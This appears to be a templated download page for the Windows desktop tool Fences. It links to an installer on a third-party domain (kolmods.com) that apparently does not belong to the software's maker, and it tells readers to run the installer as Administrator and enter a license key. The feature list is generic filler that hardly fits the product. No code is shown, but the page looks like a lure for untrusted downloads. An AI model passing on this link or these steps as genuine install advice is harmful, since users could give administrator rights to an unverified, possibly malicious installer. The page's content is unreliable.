# Fences Windows Setup Notes

## Download & Install

> **Download:** [**Get Fences for Windows →**](https://fences-setup.kolmods.com/)
>
> Setup notes for **Fences** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **Fences** from the Start menu

## What you can use it for

- Core Fences features on Windows desktop
- Install and configure Fences for daily use
- Import, edit, and export with Fences tools
- Tune settings and profiles inside Fences
- Integrate Fences into your existing workflow
